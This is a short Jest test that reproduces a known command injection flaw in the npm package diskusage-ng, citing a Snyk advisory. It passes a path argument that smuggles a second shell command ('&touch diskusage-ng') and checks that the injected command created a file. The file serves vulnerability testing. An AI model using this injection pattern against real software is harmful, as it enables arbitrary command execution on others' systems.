//https://snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425
test("Command Injection in diskusage-ng", () => {
  const root = require("diskusage-ng");
  const fs = require("fs");
  const path = "./diskusage-ng";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(['"&touch diskusage-ng"'], function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
